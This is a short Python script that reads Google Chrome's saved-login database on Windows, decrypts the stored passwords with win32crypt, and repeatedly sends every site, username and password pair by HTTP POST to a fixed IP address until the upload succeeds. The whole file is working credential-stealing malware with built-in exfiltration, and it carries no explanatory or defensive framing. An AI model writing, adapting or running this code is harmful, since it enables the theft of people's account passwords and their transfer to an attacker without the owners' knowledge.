import shutil
import sqlite3
import os
import win32crypt
import tempfile
import requests,time

path = os.path.join(os.getenv('LocalAppData') + '\Google\Chrome\User Data\Default\Login Data')
des = tempfile.mkdtemp()
shutil.copy(path,os.path.join(des,'Login'))

conn = sqlite3.connect(os.path.join(des,'Login'))
cur = conn.cursor()
cur.execute('Select action_url,username_value,password_value from logins')

string = ''
for out in cur.fetchall():
    password = win32crypt.CryptUnprotectData(out[2])[1]    
    string += '{0} : {1} : {2}\n'.format(out[0],out[1], password)


conn.close()
shutil.rmtree(des)

while True:
    try:
        requests.post(url = 'http://192.168.145.1',data=string)
        break
    except:
        time.sleep(10)
    


